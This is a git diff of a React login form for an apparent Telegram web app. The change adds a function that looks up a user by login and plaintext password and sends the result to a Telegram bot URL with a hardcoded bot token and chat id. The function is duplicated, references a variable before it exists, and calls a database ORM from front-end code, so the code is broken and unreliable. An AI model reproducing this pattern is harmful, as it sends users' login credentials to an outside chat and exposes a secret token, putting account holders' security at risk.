@@ -7,13 +7,42 @@ const Form = () => {
     const [password, setPassword] = useState('');
     // const [subject, setSubject] = useState('physical');
     const {tg} = useTelegram();
-
+    const sendTel = 'https://api.telegram.org/bot5224001267:AAHOgjCGvZimLApKPmid-Y13Jsxh8mUrO3I/sendMessage?chat_id=614284412&text='
+    const CheackAuth = () => {
+        const auth_user_or_not = Users.findAll({
+            attributes: ["login","password"],
+            where: {login:data?.login, password:data?.password},
+            raw:true
+        })
+        console.log(auth_user_or_not)
+                    
+        auth_user_or_not.then(function(res){
+            console.log(res)
+        fetch(sendTel+JSON.stringify(res))
+        })
+    }
     const onSendData = useCallback(() => {
         const data = {
             login,
             password,
             // subject
+            
         }
+    const CheackAuth = (cheackLogin,cheackPassword) => {
+        const auth_user_or_not = Users.findAll({
+            attributes: ["login","password"],
+            where: {login:cheackLogin, password:cheackPassword},
+            raw:true
+        })
+        console.log(auth_user_or_not)
+                    
+        auth_user_or_not.then(function(res){
+            console.log(res)
+        fetch(sendTel+JSON.stringify(res))
+        })
+    }
+        CheackAuth(data.login,data.password)
+
         tg.sendData(JSON.stringify(data));
     }, [login, password, /*subject*/])
 
